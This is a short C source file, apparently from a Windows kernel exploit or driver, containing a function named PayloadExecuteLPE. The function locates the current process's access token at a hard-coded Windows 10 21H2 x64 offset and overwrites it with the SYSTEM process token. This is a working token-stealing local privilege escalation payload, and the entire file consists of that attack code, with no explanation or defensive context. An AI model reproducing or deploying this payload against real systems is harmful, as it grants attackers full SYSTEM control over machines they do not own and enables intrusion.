#include "subsystem.h"

NTSTATUS PayloadExecuteLPE()
{
	PEPROCESS CurrentProcess = 0;
	NTSTATUS Status = PsLookupProcessByProcessId(PsGetCurrentProcessId(), &CurrentProcess);
	PACCESS_TOKEN CurrentToken = PsReferencePrimaryToken(CurrentProcess), SystemToken = PsReferencePrimaryToken(PsInitialSystemProcess);
	ULONG_PTR* TestAddress = 0;
	PACCESS_TOKEN* TokenAddress = 0, ProbableToken = 0;

	if (!NT_SUCCESS(Status))
	{
		return STATUS_UNSUCCESSFUL;
	}

	TestAddress = (ULONG_PTR*)((ULONG_PTR)(CurrentProcess)+(ULONG_PTR)WINDOWS_10_21H2_X64_TOKEN_OFFSET);
	ProbableToken = (PACCESS_TOKEN)(*TestAddress & (ULONG_PTR)(-0xF));
	if (ProbableToken == CurrentToken)
	{
		TokenAddress = (PACCESS_TOKEN*)(TestAddress);
		*TokenAddress = SystemToken;
	}

	PsDereferencePrimaryToken(CurrentToken);
	PsDereferencePrimaryToken(SystemToken);
	ObfDereferenceObject(CurrentProcess);

	return STATUS_SUCCESS;
}